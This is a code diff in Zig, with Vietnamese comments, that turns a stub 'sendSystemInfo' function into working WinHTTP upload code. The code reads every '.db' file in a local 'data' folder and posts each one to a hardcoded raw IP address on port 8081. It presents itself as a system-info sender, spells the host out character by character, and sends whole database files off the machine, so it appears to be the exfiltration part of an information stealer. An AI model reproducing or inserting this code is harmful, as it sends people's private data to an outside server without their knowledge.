@@ -1,12 +1,220 @@
 const std = @import("std");
-const SystemInfo = @import("../types/SystemInfo.zig").SystemInfo;
+const windows = std.os.windows;
 
-pub fn sendData() !void {
-    // TODO: Implement your API call logic here
+const WINHTTP = struct {
+    pub const HINTERNET = *opaque {};
+    pub const LPCWSTR = [*:0]const u16;
+    pub const DWORD = windows.DWORD;
+    pub const LPVOID = windows.LPVOID;
+    pub const BOOL = windows.BOOL;
+
+    pub const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY = 0;
+    pub const WINHTTP_QUERY_STATUS_CODE = 19;
+    pub const WINHTTP_QUERY_FLAG_NUMBER = 0x20000000;
+
+    extern "winhttp" fn WinHttpOpen(
+        pszAgentW: LPCWSTR,
+        dwAccessType: DWORD,
+        pszProxyW: ?LPCWSTR,
+        pszProxyBypassW: ?LPCWSTR,
+        dwFlags: DWORD,
+    ) callconv(windows.WINAPI) ?HINTERNET;
+
+    extern "winhttp" fn WinHttpConnect(
+        hSession: HINTERNET,
+        pswzServerName: LPCWSTR,
+        nServerPort: u16,
+        dwReserved: DWORD,
+    ) callconv(windows.WINAPI) ?HINTERNET;
+
+    extern "winhttp" fn WinHttpOpenRequest(
+        hConnect: HINTERNET,
+        pwszVerb: LPCWSTR,
+        pwszObjectName: LPCWSTR,
+        pwszVersion: ?LPCWSTR,
+        pwszReferrer: ?LPCWSTR,
+        ppwszAcceptTypes: ?LPCWSTR,
+        dwFlags: DWORD,
+    ) callconv(windows.WINAPI) ?HINTERNET;
+
+    extern "winhttp" fn WinHttpSendRequest(
+        hRequest: HINTERNET,
+        lpszHeaders: ?LPCWSTR,
+        dwHeadersLength: DWORD,
+        lpOptional: ?LPVOID,
+        dwOptionalLength: DWORD,
+        dwTotalLength: DWORD,
+        dwContext: usize,
+    ) callconv(windows.WINAPI) BOOL;
+
+    extern "winhttp" fn WinHttpWriteData(
+        hRequest: HINTERNET,
+        lpBuffer: LPVOID,
+        dwNumberOfBytesToWrite: DWORD,
+        lpdwNumberOfBytesWritten: *DWORD,
+    ) callconv(windows.WINAPI) BOOL;
+
+    extern "winhttp" fn WinHttpReceiveResponse(
+        hRequest: HINTERNET,
+        lpReserved: ?LPVOID,
+    ) callconv(windows.WINAPI) BOOL;
+
+    extern "winhttp" fn WinHttpCloseHandle(hInternet: HINTERNET) callconv(windows.WINAPI) BOOL;
+
+    extern "winhttp" fn WinHttpQueryHeaders(
+        hRequest: HINTERNET,
+        dwInfoLevel: DWORD,
+        pwszName: ?LPCWSTR,
+        lpBuffer: LPVOID,
+        lpdwBufferLength: *DWORD,
+        lpdwIndex: ?*DWORD,
+    ) callconv(windows.WINAPI) BOOL;
+};
+
+// Các chuỗi UTF-16 cố định
+const USER_AGENT = [_:0]u16{ 'Z', 'i', 'g', ' ', 'S', 'y', 's', 't', 'e', 'm', ' ', 'I', 'n', 'f', 'o' };
+const SERVER_HOST = [_:0]u16{ '1', '5', '0', '.', '9', '5', '.', '1', '1', '4', '.', '1', '2', '0' };
+const POST_METHOD = [_:0]u16{ 'P', 'O', 'S', 'T' };
+const UPLOAD_PATH = [_:0]u16{ '/', 'u', 'p', 'l', 'o', 'a', 'd' };
+const BOUNDARY = [_:0]u16{ '-', '-', 'b', 'o', 'u', 'n', 'd', 'a', 'r', 'y', '1', '2', '3', '4', '5' };
+const CONTENT_TYPE_HEADER = [_:0]u16{ 'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e', ':', ' ', 'm', 'u', 'l', 't', 'i', 'p', 'a', 'r', 't', '/', 'f', 'o', 'r', 'm', '-', 'd', 'a', 't', 'a', ';', ' ', 'b', 'o', 'u', 'n', 'd', 'a', 'r', 'y', '=', '-', '-', 'b', 'o', 'u', 'n', 'd', 'a', 'r', 'y', '1', '2', '3', '4', '5', '\r', '\n' };
+
+pub fn sendSystemInfo() !void {
+    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+    const allocator = gpa.allocator();
+    defer _ = gpa.deinit();
+
+    // Mở thư mục data
+    var dir = try std.fs.cwd().openDir("data", .{ .iterate = true });
+    defer dir.close();
+
+    // Duyệt qua từng file trong thư mục
+    var dir_iterator = dir.iterate();
+    while (try dir_iterator.next()) |entry| {
+        if (entry.kind != .file) continue;
+        if (!std.mem.endsWith(u8, entry.name, ".db")) continue;
+
+        std.debug.print("Processing file: {s}\n", .{entry.name});
+
+        // Mở file
+        const file = try dir.openFile(entry.name, .{ .mode = .read_only });
+        defer file.close();
+
+        // Đọc nội dung file
+        const file_size = try file.getEndPos();
+        const file_content = try file.readToEndAlloc(allocator, file_size);
+        defer allocator.free(file_content);
+
+        // Gửi file lên server
+        try sendFileContent(file_content, entry.name);
+    }
 }
 
-pub fn sendSystemInfo(allocator: std.mem.Allocator, info: []const SystemInfo) !void {
-    // TODO: Implement your API call logic here
-    _ = allocator;
-    _ = info;
+// Hàm phụ để gửi nội dung file
+fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
+    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+    const allocator = gpa.allocator();
+    defer _ = gpa.deinit();
+
+    // Tạo form-data body
+    var form_data = std.ArrayList(u8).init(allocator);
+    defer form_data.deinit();
+
+    // Thêm header cho phần form-data
+    try form_data.appendSlice("--");
+    try form_data.appendSlice("--boundary12345");
+    try form_data.appendSlice("\r\n");
+    try form_data.appendSlice("Content-Disposition: form-data; name=\"file\"; filename=\"");
+    try form_data.appendSlice(file_name);
+    try form_data.appendSlice("\"\r\n");
+    try form_data.appendSlice("Content-Type: application/octet-stream\r\n\r\n");
+
+    // Thêm nội dung file
+    try form_data.appendSlice(file_content);
+
+    // Kết thúc form-data
+    try form_data.appendSlice("\r\n--");
+    try form_data.appendSlice("--boundary12345");
+    try form_data.appendSlice("--\r\n");
+
+    // Khởi tạo WinHTTP session
+    const hSession = WINHTTP.WinHttpOpen(
+        &USER_AGENT,
+        WINHTTP.WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        null,
+        null,
+        0,
+    ) orelse return error.WinHttpOpenFailed;
+    defer _ = WINHTTP.WinHttpCloseHandle(hSession);
+
+    // Kết nối tới server
+    const hConnect = WINHTTP.WinHttpConnect(
+        hSession,
+        &SERVER_HOST,
+        8081,
+        0,
+    ) orelse return error.WinHttpConnectFailed;
+    defer _ = WINHTTP.WinHttpCloseHandle(hConnect);
+
+    // Tạo request
+    const hRequest = WINHTTP.WinHttpOpenRequest(
+        hConnect,
+        &POST_METHOD,
+        &UPLOAD_PATH,
+        null,
+        null,
+        null,
+        0,
+    ) orelse return error.WinHttpRequestFailed;
+    defer _ = WINHTTP.WinHttpCloseHandle(hRequest);
+
+    // Gửi request với form-data
+    if (WINHTTP.WinHttpSendRequest(
+        hRequest,
+        &CONTENT_TYPE_HEADER,
+        @as(WINHTTP.DWORD, CONTENT_TYPE_HEADER.len),
+        null,
+        0,
+        @intCast(form_data.items.len),
+        0,
+    ) == 0) {
+        return error.WinHttpSendRequestFailed;
+    }
+
+    // Gửi form-data body
+    var bytes_written: WINHTTP.DWORD = undefined;
+    if (WINHTTP.WinHttpWriteData(
+        hRequest,
+        @ptrCast(form_data.items.ptr),
+        @intCast(form_data.items.len),
+        &bytes_written,
+    ) == 0) {
+        return error.WinHttpWriteDataFailed;
+    }
+
+    // Nhận response
+    if (WINHTTP.WinHttpReceiveResponse(hRequest, null) == 0) {
+        return error.WinHttpReceiveResponseFailed;
+    }
+
+    // Kiểm tra status code
+    var status_code: WINHTTP.DWORD = undefined;
+    var size: WINHTTP.DWORD = @sizeOf(WINHTTP.DWORD);
+    if (WINHTTP.WinHttpQueryHeaders(
+        hRequest,
+        WINHTTP.WINHTTP_QUERY_STATUS_CODE | WINHTTP.WINHTTP_QUERY_FLAG_NUMBER,
+        null,
+        &status_code,
+        &size,
+        null,
+    ) == 0) {
+        return error.WinHttpQueryHeadersFailed;
+    }
+
+    if (status_code != 200) {
+        std.log.err("Upload failed with status code: {}", .{status_code});
+        return error.UploadFailed;
+    }
+
+    std.log.info("Database file uploaded successfully", .{});
 }
